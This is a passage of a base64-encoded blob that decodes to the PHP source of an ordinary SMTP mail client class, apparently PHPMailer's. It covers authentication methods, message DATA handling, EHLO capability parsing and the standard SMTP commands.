CBtZXRob2QgcmVxdWVzdGVkOiAnIC4gKCRhdXRodHlwZSA/ICRhdXRodHlwZSA6ICdVTktOT1dOJyksIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgIHNlbGY6OmVkZWJ1ZygnQXV0aCBtZXRob2RzIGF2YWlsYWJsZSBvbiB0aGUgc2VydmVyOiAnIC4gaW1wbG9kZSgnLCcsICR0aGlzLT5zZXJ2ZXJfY2Fwc1snQVVUSCddKSwgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgaWYgKGVtcHR5KCRhdXRodHlwZSkpIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJ0NSQU0tTUQ1JywNCiAgICAgICAgICAgICAgICAgICAgJ0xPR0lOJywNCiAgICAgICAgICAgICAgICAgICAgJ1BMQUlOJywNCiAgICAgICAgICAgICAgICAgICAgJ05UTE0nLA0KICAgICAgICAgICAgICAgICAgICAnWE9BVVRIMicNCiAgICAgICAgICAgICAgICApIGFzICRtZXRob2QpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRtZXRob2QsICR0aGlzLT5zZXJ2ZXJfY2Fwc1snQVVUSCddKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGh0eXBlID0gJG1ldGhvZDsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkYXV0aHR5cGUpKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignTm8gc3VwcG9ydGVkIGF1dGhlbnRpY2F0aW9uIG1ldGhvZHMgZm91bmQnKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBzZWxmOjplZGVidWcoJ0F1dGggbWV0aG9kIHNlbGVjdGVkOiAnIC4gJGF1dGh0eXBlLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoIWluX2FycmF5KCRhdXRodHlwZSwgJHRoaXMtPnNlcnZlcl9jYXBzWydBVVRIJ10pKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCJUaGUgcmVxdWVzdGVkIGF1dGhlbnRpY2F0aW9uIG1ldGhvZCBcIiRhdXRodHlwZVwiIGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhlIHNlcnZlciIpOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlaWYgKGVtcHR5KCRhdXRodHlwZSkpIHsNCiAgICAgICAgICAgICRhdXRodHlwZSA9ICdMT0dJTic7DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkYXV0aHR5cGUpIHsNCiAgICAgICAgICAgIGNhc2UgJ1BMQUlOJzoNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCcsICdBVVRIIFBMQUlOJywgMzM0KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdVc2VyICYgUGFzc3dvcmQnLCBiYXNlNjRfZW5jb2RlKCJcMCIgLiAkdXNlcm5hbWUgLiAiXDAiIC4gJHBhc3N3b3JkKSwgMjM1KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnTE9HSU4nOg0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIJywgJ0FVVEggTE9HSU4nLCAzMzQpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoIlVzZXJuYW1lIiwgYmFzZTY0X2VuY29kZSgkdXNlcm5hbWUpLCAzMzQpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoIlBhc3N3b3JkIiwgYmFzZTY0X2VuY29kZSgkcGFzc3dvcmQpLCAyMzUpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdYT0FVVEgyJzoNCiAgICAgICAgICAgICAgICBpZiAoaXNfbnVsbCgkT0F1dGgpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJG9hdXRoID0gJE9BdXRoLT5nZXRPYXV0aDY0KCk7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0FVVEgnLCAnQVVUSCBYT0FVVEgyICcgLiAkb2F1dGgsIDIzNSkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ05UTE0nOg0KICAgICAgICAgICAgICAgICR0ZW1wICAgICAgICA9IG5ldyBzdGRDbGFzczsNCiAgICAgICAgICAgICAgICAkbnRsbV9jbGllbnQgPSBuZXcgbnRsbV9zYXNsX2NsaWVudF9jbGFzczsNCiAgICAgICAgICAgICAgICBpZiAoISRudGxtX2NsaWVudC0+aW5pdGlhbGl6ZSgkdGVtcCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0ZW1wLT5lcnJvcik7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1lvdSBuZWVkIHRvIGVuYWJsZSBzb21lIG1vZHVsZXMgaW4geW91ciBwaHAuaW5pIGZpbGU6ICcgLiAkdGhpcy0+ZXJyb3JbJ2Vycm9yJ10sIHNlbGY6OkRFQlVHX0NMSUVOVCk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJG1zZzEgPSAkbnRsbV9jbGllbnQtPnR5cGVNc2cxKCRyZWFsbSwgJHdvcmtzdGF0aW9uKTsNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCBOVExNJywgJ0FVVEggTlRMTSAnIC4gYmFzZTY0X2VuY29kZSgkbXNnMSksIDMzNCkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY2hhbGxlbmdlID0gc3Vic3RyKCR0aGlzLT5sYXN0X3JlcGx5LCAzKTsNCiAgICAgICAgICAgICAgICAkY2hhbGxlbmdlID0gYmFzZTY0X2RlY29kZSgkY2hhbGxlbmdlKTsNCiAgICAgICAgICAgICAgICAkbnRsbV9yZXMgID0gJG50bG1fY2xpZW50LT5OVExNUmVzcG9uc2Uoc3Vic3RyKCRjaGFsbGVuZ2UsIDI0LCA4KSwgJHBhc3N3b3JkKTsNCiAgICAgICAgICAgICAgICAkbXNnMyAgICAgID0gJG50bG1fY2xpZW50LT50eXBlTXNnMygkbnRsbV9yZXMsICR1c2VybmFtZSwgJHJlYWxtLCAkd29ya3N0YXRpb24pOw0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1VzZXJuYW1lJywgYmFzZTY0X2VuY29kZSgkbXNnMyksIDIzNSk7DQogICAgICAgICAgICBjYXNlICdDUkFNLU1ENSc6DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0FVVEggQ1JBTS1NRDUnLCAnQVVUSCBDUkFNLU1ENScsIDMzNCkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY2hhbGxlbmdlID0gYmFzZTY0X2RlY29kZShzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDQpKTsNCiAgICAgICAgICAgICAgICAkcmVzcG9uc2UgID0gJHVzZXJuYW1lIC4gJyAnIC4gJHRoaXMtPmhtYWMoJGNoYWxsZW5nZSwgJHBhc3N3b3JkKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdVc2VybmFtZScsIGJhc2U2NF9lbmNvZGUoJHJlc3BvbnNlKSwgMjM1KTsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCJBdXRoZW50aWNhdGlvbiBtZXRob2QgXCIkYXV0aHR5cGVcIiBpcyBub3Qgc3VwcG9ydGVkIik7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gaG1hYygkZGF0YSwgJGtleSkgew0KICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdoYXNoX2htYWMnKSkgew0KICAgICAgICAgICAgcmV0dXJuIGhhc2hfaG1hYygnbWQ1JywgJGRhdGEsICRrZXkpOw0KICAgICAgICB9DQogICAgICAgICRieXRlbGVuID0gNjQ7DQogICAgICAgIGlmIChzdHJsZW4oJGtleSkgPiAkYnl0ZWxlbikgew0KICAgICAgICAgICAgJGtleSA9IHBhY2soJ0gqJywgbWQ1KCRrZXkpKTsNCiAgICAgICAgfQ0KICAgICAgICAka2V5ICAgID0gc3RyX3BhZCgka2V5LCAkYnl0ZWxlbiwgY2hyKDB4MDApKTsNCiAgICAgICAgJGlwYWQgICA9IHN0cl9wYWQoJycsICRieXRlbGVuLCBjaHIoMHgzNikpOw0KICAgICAgICAkb3BhZCAgID0gc3RyX3BhZCgnJywgJGJ5dGVsZW4sIGNocigweDVjKSk7DQogICAgICAgICRrX2lwYWQgPSAka2V5IF4gJGlwYWQ7DQogICAgICAgICRrX29wYWQgPSAka2V5IF4gJG9wYWQ7DQogICAgICAgIHJldHVybiBtZDUoJGtfb3BhZCAuIHBhY2soJ0gqJywgbWQ1KCRrX2lwYWQgLiAkZGF0YSkpKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNvbm5lY3RlZCgpIHsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7DQogICAgICAgICAgICAkc29ja19zdGF0dXMgPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkdGhpcy0+c210cF9jb25uKTsNCiAgICAgICAgICAgIGlmICgkc29ja19zdGF0dXNbJ2VvZiddKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCBOT1RJQ0U6IEVPRiBjYXVnaHQgd2hpbGUgY2hlY2tpbmcgaWYgY29ubmVjdGVkJywgc2VsZjo6REVCVUdfQ0xJRU5UKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+Y2xvc2UoKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbG9zZSgpIHsNCiAgICAgICAgJHRoaXMtPnNldEVycm9yKCcnKTsNCiAgICAgICAgJHRoaXMtPnNlcnZlcl9jYXBzID0gbnVsbDsNCiAgICAgICAgJHRoaXMtPmhlbG9fcnBseSAgID0gbnVsbDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7DQogICAgICAgICAgICBmY2xvc2UoJHRoaXMtPnNtdHBfY29ubik7DQogICAgICAgICAgICAkdGhpcy0+c210cF9jb25uID0gbnVsbDsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ0Nvbm5lY3Rpb246IGNsb3NlZCcsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBkYXRhKCRtc2dfZGF0YSkgew0KICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnREFUQScsICdEQVRBJywgMzU0KSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRsaW5lcyAgICAgID0gZXhwbG9kZSgiXG4iLCBzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgICAgICJcclxuIiwNCiAgICAgICAgICAgICJcciINCiAgICAgICAgKSwgIlxuIiwgJG1zZ19kYXRhKSk7DQogICAgICAgICRmaWVsZCAgICAgID0gc3Vic3RyKCRsaW5lc1swXSwgMCwgc3RycG9zKCRsaW5lc1swXSwgJzonKSk7DQogICAgICAgICRpbl9oZWFkZXJzID0gZmFsc2U7DQogICAgICAgIGlmICghZW1wdHkoJGZpZWxkKSAmJiBzdHJwb3MoJGZpZWxkLCAnICcpID09PSBmYWxzZSkgew0KICAgICAgICAgICAgJGluX2hlYWRlcnMgPSB0cnVlOw0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgew0KICAgICAgICAgICAgJGxpbmVzX291dCA9IGFycmF5KCk7DQogICAgICAgICAgICBpZiAoJGluX2hlYWRlcnMgYW5kICRsaW5lID09ICcnKSB7DQogICAgICAgICAgICAgICAgJGluX2hlYWRlcnMgPSBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHdoaWxlIChpc3NldCgkbGluZVtzZWxmOjpNQVhfTElORV9MRU5HVEhdKSkgew0KICAgICAgICAgICAgICAgICRwb3MgPSBzdHJycG9zKHN1YnN0cigkbGluZSwgMCwgc2VsZjo6TUFYX0xJTkVfTEVOR1RIKSwgJyAnKTsNCiAgICAgICAgICAgICAgICBpZiAoISRwb3MpIHsNCiAgICAgICAgICAgICAgICAgICAgJHBvcyAgICAgICAgID0gc2VsZjo6TUFYX0xJTkVfTEVOR1RIIC0gMTsNCiAgICAgICAgICAgICAgICAgICAgJGxpbmVzX291dFtdID0gc3Vic3RyKCRsaW5lLCAwLCAkcG9zKTsNCiAgICAgICAgICAgICAgICAgICAgJGxpbmUgICAgICAgID0gc3Vic3RyKCRsaW5lLCAkcG9zKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbGluZXNfb3V0W10gPSBzdWJzdHIoJGxpbmUsIDAsICRwb3MpOw0KICAgICAgICAgICAgICAgICAgICAkbGluZSAgICAgICAgPSBzdWJzdHIoJGxpbmUsICRwb3MgKyAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCRpbl9oZWFkZXJzKSB7DQogICAgICAgICAgICAgICAgICAgICRsaW5lID0gIlx0IiAuICRsaW5lOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRsaW5lc19vdXRbXSA9ICRsaW5lOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpbmVzX291dCBhcyAkbGluZV9vdXQpIHsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsaW5lX291dCkgYW5kICRsaW5lX291dFswXSA9PSAnLicpIHsNCiAgICAgICAgICAgICAgICAgICAgJGxpbmVfb3V0ID0gJy4nIC4gJGxpbmVfb3V0Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdGhpcy0+Y2xpZW50X3NlbmQoJGxpbmVfb3V0IC4gc2VsZjo6Q1JMRik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHNhdmV0aW1lbGltaXQgICA9ICR0aGlzLT5UaW1lbGltaXQ7DQogICAgICAgICR0aGlzLT5UaW1lbGltaXQgPSAkdGhpcy0+VGltZWxpbWl0ICogMjsNCiAgICAgICAgJHJlc3VsdCAgICAgICAgICA9ICR0aGlzLT5zZW5kQ29tbWFuZCgnREFUQSBFTkQnLCAnLicsIDI1MCk7DQogICAgICAgICR0aGlzLT5UaW1lbGltaXQgPSAkc2F2ZXRpbWVsaW1pdDsNCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBoZWxsbygkaG9zdCA9ICcnKSB7DQogICAgICAgIHJldHVybiAoYm9vbGVhbikgKCR0aGlzLT5zZW5kSGVsbG8oJ0VITE8nLCAkaG9zdCkgb3IgJHRoaXMtPnNlbmRIZWxsbygnSEVMTycsICRob3N0KSk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kSGVsbG8oJGhlbGxvLCAkaG9zdCkgew0KICAgICAgICAkbm9lcnJvciAgICAgICAgID0gJHRoaXMtPnNlbmRDb21tYW5kKCRoZWxsbywgJGhlbGxvIC4gJyAnIC4gJGhvc3QsIDI1MCk7DQogICAgICAgICR0aGlzLT5oZWxvX3JwbHkgPSAkdGhpcy0+bGFzdF9yZXBseTsNCiAgICAgICAgaWYgKCRub2Vycm9yKSB7DQogICAgICAgICAgICAkdGhpcy0+cGFyc2VIZWxsb0ZpZWxkcygkaGVsbG8pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPnNlcnZlcl9jYXBzID0gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJG5vZXJyb3I7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBwYXJzZUhlbGxvRmllbGRzKCR0eXBlKSB7DQogICAgICAgICR0aGlzLT5zZXJ2ZXJfY2FwcyA9IGFycmF5KCk7DQogICAgICAgICRsaW5lcyAgICAgICAgICAgICA9IGV4cGxvZGUoIlxuIiwgJHRoaXMtPmhlbG9fcnBseSk7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbiA9PiAkcykgew0KICAgICAgICAgICAgJHMgPSB0cmltKHN1YnN0cigkcywgNCkpOw0KICAgICAgICAgICAgaWYgKGVtcHR5KCRzKSkgew0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGZpZWxkcyA9IGV4cGxvZGUoJyAnLCAkcyk7DQogICAgICAgICAgICBpZiAoIWVtcHR5KCRmaWVsZHMpKSB7DQogICAgICAgICAgICAgICAgaWYgKCEkbikgew0KICAgICAgICAgICAgICAgICAgICAkbmFtZSAgID0gJHR5cGU7DQogICAgICAgICAgICAgICAgICAgICRmaWVsZHMgPSAkZmllbGRzWzBdOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRuYW1lID0gYXJyYXlfc2hpZnQoJGZpZWxkcyk7DQogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJG5hbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgJ1NJWkUnOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmaWVsZHMgPSAoJGZpZWxkcyA/ICRmaWVsZHNbMF0gOiAwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgJ0FVVEgnOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghaXNfYXJyYXkoJGZpZWxkcykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9IGFycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmllbGRzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHNbJG5hbWVdID0gJGZpZWxkczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gbWFpbCgkZnJvbSkgew0KICAgICAgICAkdXNlVmVycCA9ICgkdGhpcy0+ZG9fdmVycCA/ICcgWFZFUlAnIDogJycpOw0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdNQUlMIEZST00nLCAnTUFJTCBGUk9NOjwnIC4gJGZyb20gLiAnPicgLiAkdXNlVmVycCwgMjUwKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHF1aXQoJGNsb3NlX29uX2Vycm9yID0gdHJ1ZSkgew0KICAgICAgICAkbm9lcnJvciA9ICR0aGlzLT5zZW5kQ29tbWFuZCgnUVVJVCcsICdRVUlUJywgMjIxKTsNCiAgICAgICAgJGVyciAgICAgPSAkdGhpcy0+ZXJyb3I7DQogICAgICAgIGlmICgkbm9lcnJvciBvciAkY2xvc2Vfb25fZXJyb3IpIHsNCiAgICAgICAgICAgICR0aGlzLT5jbG9zZSgpOw0KICAgICAgICAgICAgJHRoaXMtPmVycm9yID0gJGVycjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJG5vZXJyb3I7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiByZWNpcGllbnQoJGFkZHJlc3MpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnUkNQVCBUTycsICdSQ1BUIFRPOjwnIC4gJGFkZHJlc3MgLiAnPicsIGFycmF5KA0KICAgICAgICAgICAgMjUwLA0KICAgICAgICAgICAgMjUxDQogICAgICAgICkpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcmVzZXQoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1JTRVQnLCAnUlNFVCcsIDI1MCk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kQ29tbWFuZCgkY29tbWFuZCwgJGNvbW1hbmRzdHJpbmcsICRleHBlY3QpIHsNCiAgICAgICAgaWYgKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiQ2FsbGVkICRjb21tYW5kIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHN0cnBvcygkY29tbWFuZHN0cmluZywgIlxuIikgIT09IGZhbHNlIG9yIHN0cnBvcygkY29tbWFuZHN0cmluZywgIlxyIikgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoIkNvbW1hbmQgJyRjb21tYW5kJyBjb250YWluZWQgbGluZSBicmVha3MiKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+Y2xpZW50X3NlbmQoJGNvbW1hbmRzdHJpbmcgLiBzZWxmOjpDUkxGKTsNCiAgICAgICAgJHRoaXMtPmxhc3RfcmVwbHkgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7DQogICAgICAgICRtYXRjaGVzICAgICAgICAgID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9eKFswLTldezN9KVsgLV0oPzooWzAtOV1cXC5bMC05XVxcLlswLTldKSApPy8iLCAkdGhpcy0+bGFzdF9yZXBseSwgJG1hdGNoZXMpKSB7DQogICAgICAgICAgICAkY29kZSAgICA9ICRtYXRjaGVzWzFdOw0KICAgICAgICAgICAgJGNvZGVfZXggPSAoY291bnQoJG1hdGNoZXMpID4gMiA/ICRtYXRjaGVzWzJdIDogbnVsbCk7DQogICAgICAgICAgICAkZGV0YWlsICA9IHByZWdfcmVwbGFjZSgiL3skY29kZX1bIC1dIiAuICgkY29kZV9leCA/IHN0cl9yZXBsYWNlKCcuJywgJ1xcLicsICRjb2RlX2V4KSAuICcgJyA6ICcnKSAuICIvbSIsICcnLCAkdGhpcy0+bGFzdF9yZXBseSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkY29kZSAgICA9IHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgMCwgMyk7DQogICAgICAgICAgICAkY29kZV9leCA9IG51bGw7DQogICAgICAgICAgICAkZGV0YWlsICA9IHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgNCk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU0VSVkVSIC0+IENMSUVOVDogJyAuICR0aGlzLT5sYXN0X3JlcGx5LCBzZWxmOjpERUJVR19TRVJWRVIpOw0KICAgICAgICBpZiAoIWluX2FycmF5KCRjb2RlLCAoYXJyYXkpICRleHBlY3QpKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoIiRjb21tYW5kIGNvbW1hbmQgZmFpbGVkIiwgJGRldGFpbCwgJGNvZGUsICRjb2RlX2V4KTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgRVJST1I6ICcgLiAkdGhpcy0+ZXJyb3JbJ2Vycm9yJ10gLiAnOiAnIC4gJHRoaXMtPmxhc3RfcmVwbHksIHNlbGY6OkRFQlVHX0NMSUVOVCk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPnNldEVycm9yKCcnKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZW5kQW5kTWFpbCgkZnJvbSkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdTQU1MJywgIlNBTUwgRlJPTTokZnJvbSIsIDI1MCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiB2ZXJpZnkoJG5hbWUpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnVlJGWScsICJWUkZZICRuYW1lIiwgYXJyYXkoDQogICAgICAgICAgICAyNTAsDQogICAgICAgICAgICAyNTENCiAgICAgICAgKSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBub29wKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdOT09QJywgJ05PT1AnLCAyNTApOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gdHVybigpIHsNCiAgICAgICAgJHRoaXMtPnNldEVycm9yKCdUaGUgU01UUCBUVVJOIGNvbW1hbmQgaXMgbm90IGltcGxlbWVudGVkJyk7DQogICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgTk9USUNFOiAnIC4gJHRoaXMtPmVycm9yWydlcnJvciddLCBzZWxmOjpERUJVR19DTElFTlQpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGllbnRfc2VuZCgkZGF0YSkgew0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCJDTElFTlQgLT4gU0VSVkVSOiAkZGF0YSIsIHNlbGY6OkRFQlVHX0NMSUVOVCk7DQogICAgICAgIHJldHVybiBmd3JpdGUoJHRoaXMtPnNtdHBfY29ubiwgJGRhdGEpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0RXJyb3IoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+ZXJyb3I7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTZXJ2ZXJFeHRMaXN0KCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlcnZlcl9jYXBzOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U2VydmVyRXh0KCRuYW1lKSB7DQogICAgICAgIGlmICghJHRoaXMtPnNlcnZlcl9jYXBzKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ05vIEhFTE8vRUhMTyB3YXMgc2VudCcpOw0KICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRuYW1lLCAkdGhpcy0+c2VydmVyX2NhcHMpKSB7DQogICAgICAgICAgICBpZiAoJG5hbWUgPT0gJ0hFTE8nKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZXJ2ZXJfY2Fwc1snRUhMTyddOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRuYW1lID09ICdFSExPJyB8fCBhcnJheV9rZXlfZXhpc3RzKCdFSExPJ